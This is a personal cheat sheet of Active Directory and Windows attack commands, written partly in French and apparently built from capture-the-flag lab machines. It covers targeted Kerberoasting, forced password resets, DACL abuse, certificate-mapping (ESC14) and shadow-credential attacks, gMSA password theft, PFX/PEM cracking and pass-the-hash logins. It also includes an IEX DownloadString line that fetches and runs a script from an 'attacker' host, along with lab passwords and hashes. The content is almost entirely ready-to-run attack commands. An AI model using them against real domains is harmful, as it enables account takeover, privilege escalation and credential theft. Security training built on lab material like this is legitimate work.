# AD AND WINDOWS SCRIPT HINTS

## <mark style="color:red;">Change Password (WINDOWS)</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>

{% code fullWidth="true" %}
```powershell
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred



// ---------------------------------------------------------------- //

$targetUser = 'benjamin'
$benjaminNewPassword = ConvertTo-SecureString -AsPlainText -Force 'NewPassword1!'
$michaelPass = ConvertTo-SecureString -AsPlainText -Force 'NewPassword1!'
$michaelCreds = [PSCredential]::new("administrator.htb\michael", $michaelPass)
Set-ADAccountPassword -Identity $targetUser -NewPassword $benjaminNewPassword -Credential $michaelCreds -Reset -Confirm:$false
```
{% endcode %}

***

## <mark style="color:red;">Kerberoasting avec PowerView</mark>

{% code fullWidth="true" %}
```sh
Get-ADObject -Filter 'samAccountName -like "ethan"' | Set-ADObject -Add @{ServicePrincipalName='pwn/pwn'}
Get-ADObject -Filter 'samAccountName -like "ethan"' -Property ServicePrincipalName

faketime "$(ntpdate -q DC.administrator.htb | cut -d ' ' -f 1,2)" impacket-GetUserSPNs 'administrator.htb/olivia:ichliebedich' -dc-ip 10.129.133.9 -request
```
{% endcode %}

OU

{% code fullWidth="true" %}
```powershell
Import-Module ./Poweview.ps1

Set-DomainObject -Identity ETHAN -SET @{serviceprincipalname='kerberoast/ethan'}

$SecPassword = ConvertTo-SecureString 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ADMINISTRATOR.HTB\emily', $SecPassword)

Get-DomainSPNTicket -Credential $Cred -SPN 'kerberoast/ethan'
```
{% endcode %}

***

## <mark style="color:red;">NFS Exploitation</mark>

#### 📂 Basic Operations

```bash
# List NFS exports
showmount -e <IP>

# Create mount point
sudo mkdir /mnt/nfs_target

# Mount NFS share
sudo mount -t nfs <IP>:/helpdesk /mnt/nfs_target
sudo mount -t nfs -o vers=3 <IP>:/share /mnt/nfs_target  # Force NFSv3

# Check mounted
df -h | grep nfs
mount | grep nfs

# Unmount
sudo umount /mnt/nfs_target
```

#### 📥 File Extraction

```bash
# Copy all files from NFS to local
cd /mnt/nfs_target
for file in *; do 
    sudo cp "$file" /tmp/loot/
done

# Alternative: using rsync
rsync -av /mnt/nfs_target/ /tmp/loot/

# Fix permissions
cd /tmp/loot
sudo chown -R $(whoami):$(whoami) ./*
chmod 600 *
```

#### 🔍 Enumerate NFS permissions

```bash
# Check file ownership and permissions
ls -la /mnt/nfs_target

# Try to write (test permissions)
touch /mnt/nfs_target/test.txt 2>/dev/null && echo "Write: YES" || echo "Write: NO"

# Check NFS options
mount | grep nfs | grep /mnt/nfs_target
```

***

## <mark style="color:red;">Certificate Operations</mark>

#### 🔐 PFX Password Cracking

**Extract hash from PFX**

```bash
# Single file
pfx2john clark.pfx > clark.hash

# Multiple files (one-liner)
for pfx in *.pfx; do 
    pfx2john "$pfx" > "${pfx%.pfx}.hash"
done

# Batch extraction
ls *.pfx | xargs -I {} pfx2john {} > all_hashes.txt
```

**Crack with John**

```bash
# Basic cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# With rules
john --wordlist=rockyou.txt --rules=best64 hash.txt

# Multi-core
john --wordlist=rockyou.txt --fork=4 hash.txt

# Show cracked
john --show hash.txt
```

**Crack with Hashcat**

```bash
# Mode 24420: PKCS#8 Private Keys
hashcat -m 24420 hash.txt rockyou.txt

# With performance tuning
hashcat -m 24420 hash.txt rockyou.txt -w 3 -O

# Resume session
hashcat --session=pfx_crack -m 24420 hash.txt rockyou.txt
hashcat --session=pfx_crack --restore
```

#### 🔑 PEM Key Cracking

**Extract hash from encrypted PEM**

```bash
# Extract hash
pem2john.py baker.key > baker.hash

# Clean the hash (remove metadata)
# Remove: $pbkdf2$sha256$aes256_cbc
sed 's/\$pbkdf2\$sha256\$aes256_cbc//' baker.hash > baker_clean.hash

# Alternative: manual extraction
cat baker.hash | cut -d '$' -f 5- > baker_clean.hash
```

**Crack PEM hash**

```bash
# Hashcat (auto-detect mode)
hashcat baker_clean.hash rockyou.txt

# John
john --wordlist=rockyou.txt baker.hash
```

#### 📜 Certificate Information Extraction

**Read certificate (.crt)**

```bash
# Display full certificate
openssl x509 -in cert.crt -text -noout

# Extract specific fields
openssl x509 -in cert.crt -noout -subject
openssl x509 -in cert.crt -noout -issuer
openssl x509 -in cert.crt -noout -serial
openssl x509 -in cert.crt -noout -email
openssl x509 -in cert.crt -noout -dates

# One-liner for key info
openssl x509 -in cert.crt -noout -subject -issuer -serial -email
```

**Read PFX contents**

```bash
# Display info (with password prompt)
openssl pkcs12 -in cert.pfx -info

# Extract without password (if known)
openssl pkcs12 -in cert.pfx -info -passin pass:password
openssl pkcs12 -in cert.pfx -info -passin pass:  # Empty password
```

#### 🔄 Certificate Conversion

**Extract from PFX**

```bash
# Extract certificate only
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.crt
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.crt -passin pass:password

# Extract private key (encrypted)
openssl pkcs12 -in cert.pfx -nocerts -out key.pem

# Extract private key (decrypted)
openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes

# Extract both
openssl pkcs12 -in cert.pfx -out combined.pem -nodes

# Extract certificate chain
openssl pkcs12 -in cert.pfx -cacerts -nokeys -out ca-chain.crt
```

**Create PFX**

```bash
# From cert + key (with password)
openssl pkcs12 -export -out output.pfx -inkey key.pem -in cert.crt

# Without password
openssl pkcs12 -export -out output.pfx -inkey key.pem -in cert.crt -passout pass:

# Include CA chain
openssl pkcs12 -export -out output.pfx -inkey key.pem -in cert.crt -certfile ca-chain.crt

# With specific password
openssl pkcs12 -export -out output.pfx -inkey key.pem -in cert.crt -passout pass:newpassword
```

**Convert formats**

```bash
# PEM to DER
openssl x509 -in cert.pem -outform DER -out cert.der

# DER to PEM
openssl x509 -in cert.der -inform DER -out cert.pem

# PFX to PEM
openssl pkcs12 -in cert.pfx -out cert.pem -nodes

# Private key: remove encryption
openssl rsa -in encrypted.key -out decrypted.key
# Enter passphrase when prompted
```

#### 📊 Certificate Serial Number Operations

**Extract serial number**

```bash
# From certificate file
openssl x509 -in cert.crt -noout -serial
# Output: serial=62000000144951BBFA726A5C86000000000014

# From PFX
openssl pkcs12 -in cert.pfx -clcerts -nokeys -passin pass: | \
    openssl x509 -noout -serial

# Remove "serial=" prefix
openssl x509 -in cert.crt -noout -serial | cut -d'=' -f2

# Clean format (no colons)
openssl x509 -in cert.crt -noout -serial | tr -d ':' | cut -d'=' -f2
```

**Reverse serial number (for ESC14)**

```bash
# Python one-liner
python3 -c "
serial = '62000000144951BBFA726A5C86000000000014'
serial = serial.replace(':', '').lower()
serial_bytes = bytearray.fromhex(serial)
serial_bytes.reverse()
print(''.join(['%02x' % b for b in serial_bytes]))
"

# Save as script
cat > reverse_serial.py <<'EOF'
#!/usr/bin/env python3
import sys

def reverse_serial(serial):
    serial = serial.replace(':', '').lower()
    serial_bytes = bytearray.fromhex(serial)
    serial_bytes.reverse()
    return ''.join(['%02x' % b for b in serial_bytes])

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <serial_number>")
        sys.exit(1)
    print(reverse_serial(sys.argv[1]))
EOF

chmod +x reverse_serial.py
./reverse_serial.py "62000000144951BBFA726A5C86000000000014"
```

**Extract issuer DN**

```bash
# Standard format
openssl x509 -in cert.crt -noout -issuer

# For ESC14 mapping (remove "issuer=", replace ", " with ",")
openssl x509 -in cert.crt -noout -issuer | \
    sed 's/issuer=//' | \
    sed 's/, /,/g'

# One-liner for mapping string
ISSUER=$(openssl x509 -in cert.crt -noout -issuer | sed 's/issuer=//' | sed 's/, /,/g')
SERIAL=$(python3 reverse_serial.py "$(openssl x509 -in cert.crt -noout -serial | cut -d'=' -f2)")
echo "X509:<I>$ISSUER<SR>$SERIAL"
```

***

## <mark style="color:red;">Kerberos Setup</mark>

#### ⚙️ krb5.conf Configuration

**Generate with NetExec**

```bash
# Generate config
netexec smb dc01.scepter.htb --generate-krb5-file scepter.htb.krb5.conf

# Copy to system
sudo cp scepter.htb.krb5.conf /etc/krb5.conf

# Or use custom path
export KRB5_CONFIG="$PWD/scepter.htb.krb5.conf"
```

**Manual configuration**

```bash
# Create custom krb5.conf
cat > /tmp/krb5.conf <<'EOF'
[libdefaults]
    default_realm = SCEPTER.HTB
    dns_lookup_realm = true
    dns_lookup_kdc = true
    forwardable = true
    renewable = true
    clockskew = 600

[realms]
    SCEPTER.HTB = {
        kdc = dc01.scepter.htb
        admin_server = dc01.scepter.htb
        default_domain = scepter.htb
    }

[domain_realm]
    .scepter.htb = SCEPTER.HTB
    scepter.htb = SCEPTER.HTB
EOF

# Use custom config
export KRB5_CONFIG=/tmp/krb5.conf
```

**Dynamic generation**

```bash
# Variables
LOWER_REALM='scepter.htb'
UPPER_REALM='SCEPTER.HTB'
DC_HOSTNAME='dc01'
DC_IP='10.10.11.65'

# Generate config
cat > custom_krb5.conf <<EOF
[libdefaults]
    default_realm = ${UPPER_REALM}
    dns_lookup_realm = true
    dns_lookup_kdc = true
    clockskew = 600

[realms]
    ${UPPER_REALM} = {
        kdc = ${DC_HOSTNAME}.${LOWER_REALM}
        admin_server = ${DC_HOSTNAME}.${LOWER_REALM}
    }

[domain_realm]
    ${LOWER_REALM} = ${UPPER_REALM}
    .${LOWER_REALM} = ${UPPER_REALM}
EOF

export KRB5_CONFIG="$PWD/custom_krb5.conf"
```

#### 🕐 Time Synchronization

**Sync with DC**

```bash
# Basic sync
sudo ntpdate <DC_IP>

# With verbose output
sudo ntpdate -d <DC_IP>

# Query time (no sync)
ntpdate -q <DC_IP>

# Sync and display difference
sudo ntpdate -u <DC_IP>

# Alternative: timedatectl
sudo timedatectl set-ntp false
sudo timedatectl set-time "$(date -u)"  # May need manual adjustment
```

**Check time skew**

```bash
# Get DC time
net time -S <DC_IP>

# Get local time
date

# Calculate difference
DC_TIME=$(net time -S <DC_IP> 2>/dev/null | head -n1)
LOCAL_TIME=$(date)
echo "DC: $DC_TIME"
echo "Local: $LOCAL_TIME"
```

**Faketime wrapper**

```bash
# Install faketime
sudo apt install faketime

# Get DC time first
DC_TIME=$(ntpdate -q <DC_IP> | grep "^server" | awk '{print $3, $4}')

# Run command with DC time
faketime "$DC_TIME" <command>

# Example
faketime "$(ntpdate -q dc01.scepter.htb | grep server | head -n1 | awk '{print $3, $4}')" \
    certipy auth -pfx cert.pfx -dc-ip <DC_IP>
```

#### 🎫 Ticket Operations

**List tickets**

```bash
# Using klist
klist

# Check specific cache
KRB5CCNAME=user.ccache klist

# Detailed info
klist -e  # Show encryption types
klist -f  # Show flags
```

**Ticket permissions**

```bash
# Fix permissions
chmod 600 *.ccache

# Secure ticket
export KRB5CCNAME=/tmp/.krb5cc_$(id -u)_secure
chmod 600 $KRB5CCNAME
```

**Clear tickets**

```bash
# Destroy current tickets
kdestroy

# Destroy specific cache
kdestroy -c user.ccache

# Remove all
rm -f /tmp/krb5cc_* ~/.krb5ccache
```

***

## <mark style="color:red;">Password Changes</mark>

#### 🔑 Change User Password (ForceChangePassword)

**Method 1: NetExec (Recommended)**

```bash
# With NTLM hash
netexec smb <DC_IP> -u source_user -H <HASH> \
    -M change-password -o USER=target_user NEWPASS='NewPassword123!'

# With password
netexec smb <DC_IP> -u source_user -p 'password' \
    -M change-password -o USER=target_user NEWPASS='NewPassword123!'

# With Kerberos
KRB5CCNAME=user.ccache netexec smb <DC_NAME> --use-kcache \
    -M change-password -o USER=target_user NEWPASS='NewPassword123!'
```

**Method 2: BloodyAD**

```bash
# With hash
bloodyAD --host <DC_IP> -d domain.com -u user -p :<HASH> \
    set password target_user 'NewPassword123!'

# With password
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    set password target_user 'NewPassword123!'

# With Kerberos
KRB5CCNAME=user.ccache bloodyAD --host <DC_NAME> -d domain.com -k \
    set password target_user 'NewPassword123!'
```

**Method 3: RPC (Kerberos only)**

```bash
# Setup Kerberos first
export KRB5CCNAME=user.ccache

# Change password (interactive)
net rpc user password 'target_user' --use-kerberos=required -S dc01.domain.com

# Alternative: with faketime
faketime "$(ntpdate -q <DC_IP> | awk '{print $3, $4}')" \
    net rpc user password 'target_user' --use-kerberos=required -S dc01.domain.com

# Alternative: pth-net
pth-net rpc password "target_user" "NewPassword123!" \
    -U "domain.com/source_user"%":<HASH>" -S <DC_IP>
```

**Method 4: rpcclient**

```bash
# Interactive
rpcclient -U 'domain.com/user%password' <DC_IP>
rpcclient $> setuserinfo2 target_user 23 'NewPassword123!'

# With hash
rpcclient -U 'domain.com/user' --pw-nt-hash <DC_IP>
# Enter hash when prompted
rpcclient $> setuserinfo2 target_user 23 'NewPassword123!'
```

**Method 5: PowerShell (on target)**

```powershell
# Import AD module
Import-Module ActiveDirectory

# Change password
Set-ADAccountPassword -Identity target_user -Reset `
    -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force)

# Alternative: net user
net user target_user NewPassword123! /domain
```

***

## <mark style="color:red;">DACL Modifications</mark>

#### 🔐 View Permissions

**BloodyAD**

```bash
# Read all permissions on object
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    get writable --detail

# Check specific object
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    get object target_user --attr nTSecurityDescriptor

# Check what user can write
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    get writable
```

**Impacket dacledit**

```bash
# Read permissions
impacket-dacledit -action 'read' -principal 'source_user' \
    -target 'target_user' -dc-ip <DC_IP> \
    'domain.com/user:password'

# Read with hash
impacket-dacledit -action 'read' -principal 'source_user' \
    -target 'target_user' -dc-ip <DC_IP> -hashes :<HASH> \
    'domain.com/user'

# Read with Kerberos
KRB5CCNAME=user.ccache impacket-dacledit -action 'read' \
    -principal 'source_user' -target 'target_user' \
    -dc-ip <DC_IP> -k -no-pass 'domain.com/user'@dc.domain.com
```

**PowerView (on target)**

```powershell
# Import PowerView
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Specific user
Get-DomainObjectAcl -Identity target_user -ResolveGUIDs | 
    Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser source_user).SID}

# Check specific permission
Get-DomainObjectAcl -Identity "OU=Users,DC=domain,DC=com" -ResolveGUIDs |
    Where-Object {$_.ObjectAceType -eq "Alt-Security-Identities"}
```

#### ✍️ Add Permissions

**Add GenericAll**

```bash
# BloodyAD - On user
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    add genericAll 'CN=target_user,CN=Users,DC=domain,DC=com' source_user

# BloodyAD - On OU
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    add genericAll 'OU=MyOU,DC=domain,DC=com' source_user

# Impacket dacledit
impacket-dacledit -action 'write' -rights 'FullControl' \
    -principal 'source_user' -target 'target_user' \
    -dc-ip <DC_IP> 'domain.com/user:password'
```

**Add GenericAll with Inheritance**

```bash
# This makes the permission inherit to child objects
impacket-dacledit -action 'write' -rights 'FullControl' \
    -inheritance -principal 'source_user' \
    -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' \
    'domain.com/user:password'

# Verify inheritance
impacket-dacledit -action 'read' -principal 'source_user' \
    -target 'child_object' -dc-ip <DC_IP> 'domain.com/user:password'
```

**Add WriteProperty on specific attribute**

```bash
# Example: WriteProperty on altSecurityIdentities
impacket-dacledit -action 'write' \
    -rights 'WriteProperty' \
    -ace-type 'allowed' \
    -principal 'source_user' \
    -target 'target_user' \
    -property 'altSecurityIdentities' \
    'domain.com/user:password'
```

#### 🗑️ Remove Permissions

```bash
# Remove GenericAll
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    remove genericAll 'CN=target_user,CN=Users,DC=domain,DC=com' source_user

# Remove with dacledit
impacket-dacledit -action 'remove' -rights 'FullControl' \
    -principal 'source_user' -target 'target_user' \
    'domain.com/user:password'
```

***

## <mark style="color:red;">LDAP Operations</mark>

#### 🔍 Search

**ldapsearch**

```bash
# Basic search
ldapsearch -x -H ldap://<DC_IP> -D "user@domain.com" -w 'password' \
    -b "DC=domain,DC=com" "(objectClass=user)"

# Search specific user
ldapsearch -x -H ldap://<DC_IP> -D "user@domain.com" -w 'password' \
    -b "DC=domain,DC=com" "(sAMAccountName=username)" '*'

# Search with specific attributes
ldapsearch -x -H ldap://<DC_IP> -D "user@domain.com" -w 'password' \
    -b "DC=domain,DC=com" "(sAMAccountName=username)" \
    mail sAMAccountName altSecurityIdentities

# With Kerberos
ldapsearch -Y GSSAPI -H ldap://dc.domain.com \
    -b "DC=domain,DC=com" "(objectClass=user)"

# With faketime + Kerberos
KRB5CCNAME=user.ccache faketime "$(ntpdate -q <DC_IP> | awk '{print $3, $4}')" \
    ldapsearch -Q -Y GSSAPI -H ldap://dc.domain.com \
    -b "DC=domain,DC=com" "(altSecurityIdentities=*)" \
    altSecurityIdentities sAMAccountName
```

**NetExec LDAP**

```bash
# Query user
netexec ldap <DC_IP> -u user -p 'password' \
    --query "(sAMAccountName=username)" ""

# Find all users with altSecurityIdentities
netexec ldap <DC_IP> -u user -p 'password' \
    --query "(altSecurityIdentities=*)" "altSecurityIdentities"

# Get all users
netexec ldap <DC_IP> -u user -p 'password' \
    --users

# Get all groups
netexec ldap <DC_IP> -u user -p 'password' \
    --groups
```

#### ✏️ Modify

**Add attribute**

```bash
# ldapmodify - Add email
ldapmodify -x -D 'user@domain.com' -w 'password' -H 'ldap://<DC_IP>' <<EOF
dn: CN=target_user,CN=Users,DC=domain,DC=com
changetype: modify
add: mail
mail: fake@domain.com
EOF

# BloodyAD
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    set object target_user mail -v 'fake@domain.com'
```

**Delete attribute**

```bash
# ldapmodify
ldapmodify -x -D 'user@domain.com' -w 'password' -H 'ldap://<DC_IP>' <<EOF
dn: CN=target_user,CN=Users,DC=domain,DC=com
changetype: modify
delete: mail
EOF

# BloodyAD (set to empty)
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    set object target_user mail -v ''
```

**Replace attribute**

```bash
# ldapmodify
ldapmodify -x -D 'user@domain.com' -w 'password' -H 'ldap://<DC_IP>' <<EOF
dn: CN=target_user,CN=Users,DC=domain,DC=com
changetype: modify
replace: mail
mail: new@domain.com
EOF
```

**Modify altSecurityIdentities**

```bash
# Add certificate mapping
ldapmodify -x -D 'user@domain.com' -w 'password' -H 'ldap://<DC_IP>' <<EOF
dn: CN=target_user,CN=Users,DC=domain,DC=com
changetype: modify
add: altSecurityIdentities
altSecurityIdentities: X509:<RFC822>user@domain.com
EOF

# BloodyAD
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    set object target_user altSecurityIdentities \
    -v 'X509:<RFC822>user@domain.com'

# Complex mapping (Issuer+Serial)
bloodyAD --host <DC_IP> -d domain.com -u user -p 'password' \
    set object target_user altSecurityIdentities \
    -v 'X509:<I>DC=com,DC=domain,CN=CA<SR>abc123def456'
```

**Multi-line ldapmodify (complex changes)**

```bash
# Modify multiple attributes
ldapmodify -x -D 'user@domain.com' -w 'password' -H 'ldap://<DC_IP>' <<'EOF'
dn: CN=target_user,CN=Users,DC=domain,DC=com
changetype: modify
add: mail
mail: user@domain.com
-
add: altSecurityIdentities
altSecurityIdentities: X509:<RFC822>user@domain.com
EOF
```

#### 📊 Enumeration Tools

**ldapdomaindump**

```bash
# Dump domain info
ldapdomaindump <DC_IP> -u 'DOMAIN\user' -p 'password' -o ldap_output

# With hash
ldapdomaindump <DC_IP> -u 'DOMAIN\user' -p :<HASH> -o ldap_output

# Generates HTML reports in ldap_output/
```

**GetADUsers.py (Impacket)**

```bash
# Get all users
GetADUsers.py -all -dc-ip <DC_IP> 'domain.com/user:password'

# With hash
GetADUsers.py -all -dc-ip <DC_IP> -hashes :<HASH> 'domain.com/user'

# With Kerberos
KRB5CCNAME=user.ccache GetADUsers.py -all -dc-ip <DC_IP> \
    -k -no-pass 'domain.com/user'
```

***

## <mark style="color:red;">Certificate Requests</mark>

#### 📜 Enumerate Certificate Templates

**Certipy find**

```bash
# Full enumeration
certipy find -u 'user@domain.com' -p 'password' -dc-ip <DC_IP>

# With hash
certipy find -u 'user' -hashes :<HASH> -dc-ip <DC_IP>

# Output formats
certipy find -u 'user' -p 'password' -dc-ip <DC_IP> -text
certipy find -u 'user' -p 'password' -dc-ip <DC_IP> -json -output templates.json

# Find vulnerable templates only
certipy find -u 'user' -p 'password' -dc-ip <DC_IP> -vulnerable

# Detailed output
certipy find -u 'user' -p 'password' -dc-ip <DC_IP> \
    -stdout -scheme ldap

# Save all outputs
certipy find -u 'user@domain.com' -p 'password' -dc-ip <DC_IP> \
    -vulnerable -text -json
```

**certutil (on Windows)**

```powershell
# List all templates
certutil -v -template

# View specific template
certutil -v -template TemplateName

# List CAs
certutil -config - -ping

# View CA settings
certutil -CAInfo
```

#### 📝 Request Certificate

**Basic request**

```bash
# Request with username/password
certipy req -username 'user@domain.com' -password 'password' \
    -target <DC_IP> -ca 'CA-NAME' -template 'TemplateName'

# Request with hash
certipy req -username 'user@domain.com' -hashes :<HASH> \
    -target <DC_IP> -ca 'CA-NAME' -template 'TemplateName'

# Request with Kerberos
KRB5CCNAME=user.ccache certipy req -username 'user@domain.com' \
    -k -no-pass -target dc.domain.com \
    -ca
```

***

## &#x20;<mark style="color:red;">**Grant access**</mark> <mark style="color:red;"></mark><mark style="color:red;">to retrieve the</mark> <mark style="color:red;"></mark><mark style="color:red;">**managed password**</mark>&#x20;

{% code fullWidth="true" %}
```powershell
# Configuration des paramètres pour Haze-IT-Backup
$gMSA = "Haze-IT-Backup"
# Utiliser votre compte actuel comme principal à ajouter
$PrincipalToAdd = "mark.adams"

# Récupération des membres actuels autorisés à récupérer le mot de passe
Write-Host "Current PrincipalsAllowedToRetrieveManagedPassword:"
$originalPrincipalsAllowedToRetrieveManagedPassword = Get-ADServiceAccount -Properties PrincipalsAllowedToRetrieveManagedPassword $gMSA | Select-Object -ExpandProperty PrincipalsAllowedToRetrieveManagedPassword
$originalPrincipalsAllowedToRetrieveManagedPassword
Write-Host "`n"

# Ajout de votre compte comme membre autorisé
Write-Host "New PrincipalsAllowedToRetrieveManagedPassword:"
$newPrincipalsAllowedToRetrieveManagedPassword = @()
$newPrincipalsAllowedToRetrieveManagedPassword += $originalPrincipalsAllowedToRetrieveManagedPassword
$newPrincipalsAllowedToRetrieveManagedPassword += $PrincipalToAdd
$newPrincipalsAllowedToRetrieveManagedPassword

# Application de la modification
Set-ADServiceAccount -PrincipalsAllowedToRetrieveManagedPassword $newPrincipalsAllowedToRetrieveManagedPassword $gMSA
Write-Host "`n"

# Vérification de la modification
Write-Host "Validation of updated PrincipalsAllowedToRetrieveManagedPassword:"
Get-ADServiceAccount -Properties PrincipalsAllowedToRetrieveManagedPassword $gMSA
Write-Host "`n"

# Après avoir récupéré le mot de passe, vous pourriez vouloir exécuter cette partie
# pour restaurer les paramètres originaux (mais pas avant d'utiliser le compte)
<#
Write-Host "Restoring original PrincipalsAllowedToRetrieveManagedPassword:"
Set-ADServiceAccount -PrincipalsAllowedToRetrieveManagedPassword $originalPrincipalsAllowedToRetrieveManagedPassword $gMSA
Get-ADServiceAccount -Properties PrincipalsAllowedToRetrieveManagedPassword $gMSA
#>
```
{% endcode %}

***

## <mark style="color:red;">Extract credentials after GMSA abuse</mark>

```shellscript
python3 gMSADumper.py -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -d 'haze.htb'
```

***

## <mark style="color:red;">KeyCredentialLink abuse</mark>

{% code overflow="wrap" fullWidth="true" %}
```
python3 ./pywhisker/pywhisker.py -d "haze.htb" -u "User$" -H ":7..5279ebc" --target "edward.martin" --action "add" --filename test1

python3 gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass dxQ9JVHZr4Ic5XQLMwUM  haze.htb/edward.martin edward.martin.ccache    

python3 getnthash.py -key b6cffe7be143e596c0b7c96995d59c72cd6ac8b5796cfd4f957c81e46a990ec4 haze.htb/edward.martin     
```
{% endcode %}

***

## <mark style="color:red;">Pass-the-Certificate</mark>

```
certipy-ad cert -export -pfx hmR0aTCH.pfx -password 'QMxc1tEcjlXgVEdTIHQt' -out pwn.pfx
faketime "$(ntpdate -q dc01.haze.htb | cut -d ' ' -f 1,2)"

certipy-ad auth -pfx pwn.pfx -dc-ip 10.129.242.141 -username 'edward.martin' -domain 'haze.htb'

evil-winrm -i dc01.haze.htb -u 'edward.martin' -H '09e0b3eeb2e7a6b0d419e9ff8f4d91af'

```

***

## <mark style="color:red;">FILE DISCOVERY</mark>&#x20;

```
gci C:\ -Include *.zip, *.bak, *.7z -File -Recurse -ea SilentlyContinue
```
